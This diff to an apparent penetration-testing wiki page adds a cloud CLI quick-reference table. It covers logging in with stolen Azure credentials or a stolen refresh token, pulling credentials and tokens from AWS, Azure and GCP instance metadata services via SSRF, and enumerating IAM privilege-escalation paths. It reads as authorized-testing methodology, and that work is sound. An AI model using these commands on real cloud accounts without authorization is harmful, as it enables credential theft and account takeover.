@@ -15,6 +15,34 @@ Hub: [[cloud-moc]] · Primary page: [[cloud-iam-attacks]] · Payload arsenal: `w
 Anchors: [[aws-metadata-ssrf]], [[azure-ad-iam]]
 **REFS:** [[cloud-iam-attacks]], wiki/payloads/imds-cloud-metadata.md
 
+## Cloud CLI quick reference (use this, don't hand-roll)
+
+Every command below is a real, tested CLI invocation - the SAME primitive a hand-rolled curl/urllib
+call against Graph/ARM/REST would reimplement worse (weaker, no paging, easy to misquote). Look the
+operation up here first; full context for each lives in the numbered methodology step (or the
+Tooling-first section for the non-numbered rows).
+
+| Operation | Command | Step |
+|---|---|---|
+| Azure creds in hand, ROPC login | `az login -u <upn> -p <pass>` | Tooling-first |
+| Compromised Azure compute resource, login as its managed identity | `az login --identity` | Tooling-first |
+| Entra ID dump via a stolen refresh token (FOCI, no password) | `roadrecon auth -r <refresh-token> && roadrecon dump` | Tooling-first |
+| Azure resource/VM/role enumeration once logged in | `az account list; az resource list -o table; az vm list -d -o table; az role assignment list --all` | Tooling-first |
+| AWS whoami | `aws sts get-caller-identity` | 1 |
+| Azure whoami | `az account show` | 1 |
+| Azure signed-in user | `az ad signed-in-user show` | 1 |
+| GCP auth list | `gcloud auth list` | 1 |
+| GCP config list | `gcloud config list` | 1 |
+| AWS IMDSv1 role creds (app-side SSRF) | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | 2 |
+| Azure IMDS managed-identity token | `curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"` | 2 |
+| GCP metadata service-account token | `curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"` | 2 |
+| AWS IAM authorization details (full policy dump) | `aws iam get-account-authorization-details` | 3 |
+| AWS IAM privesc-path enumeration | `enumerate-iam --access-key ... --secret-key ...` | 3 |
+| Azure role assignments for a principal | `az role assignment list --assignee <id>` | 3 |
+| Azure config-review enumeration | `ScoutSuite azure` | 3 |
+| GCP IAM policy | `gcloud projects get-iam-policy <proj>` | 3 |
+| Azure VM extension public settings leak (Reader-only, no Contributor/RunCommand) | `az vm extension show ... -n CustomScriptExtension` | 5 |
+
 ## Billing and safety (cloud-specific)
 
 `hunt-core` owns the scope gate. Cloud stacks three specifics on top of it:
